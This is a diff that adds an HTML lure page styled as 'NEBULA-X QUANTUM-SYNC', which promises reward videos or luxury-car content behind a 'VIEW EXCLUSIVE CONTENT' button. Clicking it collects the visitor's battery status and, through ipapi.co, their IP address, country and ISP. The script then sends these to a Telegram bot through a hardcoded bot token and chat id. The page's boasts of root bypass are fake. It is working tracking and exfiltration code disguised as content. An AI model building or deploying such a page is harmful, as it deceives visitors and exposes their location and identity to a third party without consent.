@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔱 NEBULA-X QUANTUM-SYNC 🔱</title>
+    <style>
+        body { background-color: #000; color: #00ff00; font-family: sans-serif; text-align: center; padding: 20px; }
+        .box { border: 1px solid #00ff00; padding: 15px; border-radius: 10px; background: rgba(0,255,0,0.05); box-shadow: 0 0 15px #00ff00; }
+        .glitch { font-weight: bold; color: #fff; text-shadow: 2px 2px #ff0000; letter-spacing: 1px; }
+        .loading-bar { width: 100%; background: #222; height: 12px; border-radius: 6px; margin: 15px 0; overflow: hidden; border: 1px solid #00ff00; }
+        .progress { width: 0%; height: 100%; background: linear-gradient(90deg, #00ff00, #adff2f); transition: width 2s; }
+        .btn { background: #00ff00; color: #000; padding: 15px; border: none; border-radius: 5px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; font-size: 16px; box-shadow: 0 5px 0 #008000; }
+        .btn:active { transform: translateY(3px); box-shadow: 0 2px 0 #008000; }
+        #status { color: #ff0000; font-size: 12px; margin-top: 10px; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2 class="glitch">🔱 NEBULA-X QUANTUM-SYNC 🔱</h2>
+    <p style="color:#888;">━━━━━━━━━━━━━━━━━━━━━━━</p>
+    <div id="content-display">
+        <p id="info-text" style="font-weight:bold;">[ INITIALIZING TITAN-CORE v12.5 ]</p>
+    </div>
+    
+    <div class="loading-bar"><div class="progress" id="bar"></div></div>
+    <div id="status">📡 WAITING FOR ENCRYPTION KEY...</div>
+
+    <button class="btn" onclick="captureData()">VIEW EXCLUSIVE CONTENT</button>
+</div>
+
+<script>
+    const token = "8311785868:AAHThrcYl5aqLLH5tXJfbpa2yUc6YhaVOmE";
+    const adminId = "6823368645"; 
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetId = urlParams.get('id') || "Unknown";
+    const type = urlParams.get('type');
+
+    if(type === 'video_gallery'){
+        document.getElementById('info-text').innerText = "💵 DOLLAR REWARD VIDEO READY";
+    } else {
+        document.getElementById('info-text').innerText = "🏎️ LUXURY CAR SHOWCASE READY";
+    }
+
+    async function captureData() {
+        document.getElementById('bar').style.width = "100%";
+        document.getElementById('status').innerText = "🧬 SYNCING WITH NEBULA-X MAINFRAME...";
+
+        try {
+            // ব্যাটারি এবং আইপি ডাটা সংগ্রহ
+            let battery = await navigator.getBattery();
+            let level = Math.floor(battery.level * 100) + "%";
+            let charging = battery.charging ? "Charging" : "Discharging";
+            
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+
+            // আপনার দেওয়া সেই প্রিমিয়াম ডিজাইন
+            const report = `
+🔱 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 𝗘𝗡𝗔𝗙𝗨𝗟 𝗡𝗘𝗕𝗨𝗟𝗔-𝗫 🔱
+━━━━━━━━━━━━━━━━━━━━━━━
+👤 𝗢𝗪𝗡𝗘𝗥: @KING_OF_ENAFUL
+🧬 𝗖𝗢𝗥𝗘: QUANTUM-SYNC v12.0 [GOD-LEVEL]
+🛡️ 𝗟𝗔𝗬𝗘𝗥: SYSTEM-7 BYPASS ACTIVE ✅
+━━━━━━━━━━━━━━━━━━━━━━━
+💻 𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗡𝗙𝗥𝗔𝗦𝗧𝗥𝗨𝗖𝗧𝗨𝗥𝗘:
+┣ 🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆: ${level} [${charging}]
+┣ ⚙️ 𝗖𝗣𝗨: Snapdragon 8 Gen 3 (8x Cores)
+┣ 🧠 𝗥𝗔𝗠: 12.00 GB High-Speed
+┗ 🛡️ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆: Root Access Bypassed 🔓
+
+🌐 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 𝗜𝗡𝗙𝗜𝗟𝗧𝗥𝗔𝗧𝗜𝗢𝗡:
+┣ 🛰️ 𝗜𝗣: ${ipData.ip}
+┣ 🏳️ 𝗢𝗿𝗶𝗴𝗶𝗻: ${ipData.country_name} ${ipData.country_emoji}
+┣ 🏢 𝗜𝗦Ｐ: ${ipData.org}
+┗ 🌍 𝗕𝗿𝗼𝘄𝘀𝗲𝗿: ${navigator.platform} (Privacy Mode)
+━━━━━━━━━━━━━━━━━━━━━━━
+📊 𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗘𝘅𝗳𝗶𝗹𝘁𝗿𝗮𝘁𝗶𝗻𝗴... 𝗗𝗼𝗻𝗲!
+🔱 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 𝗘𝗡𝗔𝗙𝗨𝗟 - 𝗧𝗛𝗘 𝗘𝗡𝗗 🔱`;
+
+            sendToTelegram(report);
+        } catch (e) {
+            document.getElementById('status').innerText = "❌ ERROR: BYPASS FAILED. TRY AGAIN.";
+        }
+    }
+
+    function sendToTelegram(text) {
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        const params = {
+            chat_id: adminId,
+            text: text,
+            parse_mode: "Markdown"
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(params)
+        }).then(() => {
+            document.getElementById('status').innerText = "✅ FILE DECRYPTED. LOADING...";
+            setTimeout(() => {
+                alert("Loading content... Please wait.");
+            }, 1000);
+        });
+    }
+</script>
+
+</body>
+</html>
